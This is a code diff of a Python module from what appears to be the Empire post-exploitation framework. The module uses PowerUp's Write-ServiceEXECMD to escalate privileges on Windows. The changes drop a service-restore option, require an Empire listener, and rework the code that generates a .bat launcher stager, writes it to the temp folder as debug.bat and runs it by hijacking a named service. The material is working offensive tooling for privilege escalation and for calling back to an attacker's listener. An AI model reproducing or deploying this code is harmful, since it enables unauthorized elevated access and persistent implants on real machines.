@@ -65,11 +65,6 @@ class Module:
                 'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                 'Required'      :   False,
                 'Value'         :   'default'
-            },
-            'Restore' : {
-                'Description'   :   "Switch. Restore the original service binary.",
-                'Required'      :   False,
-                'Value'         :   ''                
             }
         }
 
@@ -86,8 +81,8 @@ class Module:
 
     def generate(self):
 
-        # read in the common module source code
-        moduleSource = self.mainMenu.installPath + "/data/module_source/privesc/powerup/PowerUp.ps1"
+        # read in the common powerup.ps1 module source code
+        moduleSource = self.mainMenu.installPath + "/data/module_source/privesc/PowerUp.ps1"
 
         try:
             f = open(moduleSource, 'r')
@@ -98,42 +93,37 @@ class Module:
         moduleCode = f.read()
         f.close()
 
-        script = moduleCode
-
-
         serviceName = self.options['ServiceName']['Value']
         listenerName = self.options['Listener']['Value']
-        userAgent = self.options['UserAgent']['Value']
-        proxy = self.options['Proxy']['Value']
-        proxyCreds = self.options['ProxyCreds']['Value']
 
+        if not self.mainMenu.listeners.is_listener_empire(listenerName):
+            print helpers.color("[!] Empire listener required!")
+            return ""
 
-        if self.options['Restore']['Value'] != '':
-            script += "Restore-ServiceEXE -ServiceName " + serviceName
+        script = helpers.generate_dynamic_powershell_script(moduleCode, "Write-ServiceEXECMD")
+
+        # generate the .bat launcher code to write out to the specified location
+        l = self.mainMenu.stagers.stagers['launcher_bat']
+        l.options['Listener']['Value'] = self.options['Listener']['Value']
+        l.options['UserAgent']['Value'] = self.options['UserAgent']['Value']
+        l.options['Proxy']['Value'] = self.options['Proxy']['Value']
+        l.options['ProxyCreds']['Value'] = self.options['ProxyCreds']['Value']
+        if self.options['Delete']['Value'].lower() == "true":
+            l.options['Delete']['Value'] = "True"
         else:
+            l.options['Delete']['Value'] = "False"
+        launcherCode = l.generate()
 
-            # generate the .bat launcher code to write out to the specified location
-            l = self.mainMenu.stagers.stagers['launcher_bat']
-            l.options['Listener']['Value'] = self.options['Listener']['Value']
-            l.options['UserAgent']['Value'] = self.options['UserAgent']['Value']
-            l.options['Proxy']['Value'] = self.options['Proxy']['Value']
-            l.options['ProxyCreds']['Value'] = self.options['ProxyCreds']['Value']
-            if self.options['Delete']['Value'].lower() == "true":
-                l.options['Delete']['Value'] = "True"
-            else:
-                l.options['Delete']['Value'] = "False"
-            launcherCode = l.generate()
+        # PowerShell code to write the launcher.bat out
+        script += "$tempLoc = \"$env:temp\debug.bat\""
+        script += "\n$batCode = @\"\n" + launcherCode + "\"@\n"
+        script += "$batCode | Out-File -Encoding ASCII $tempLoc ;\n"
+        script += "\"Launcher bat written to $tempLoc `n\";\n"
+  
+        if launcherCode == "":
+            print helpers.color("[!] Error in launcher .bat generation.")
+            return ""
+        else:
+            script += "\nWrite-ServiceEXECMD -ServiceName \""+serviceName+"\" -CMD \"C:\Windows\System32\cmd.exe /C $tempLoc\""    
 
-            # PowerShell code to write the launcher.bat out
-            script += "$tempLoc = \"$env:temp\debug.bat\""
-            script += "\n$batCode = @\"\n" + launcherCode + "\"@\n"
-            script += "$batCode | Out-File -Encoding ASCII $tempLoc ;\n"
-            script += "\"Launcher bat written to $tempLoc `n\";\n"
-      
-            if launcherCode == "":
-                print helpers.color("[!] Error in launcher .bat generation.")
-                return ""
-            else:
-                script += "Write-ServiceEXECMD -ServiceName \""+serviceName+"\" -CMD \"C:\Windows\System32\cmd.exe /C $tempLoc\""
- 
         return script
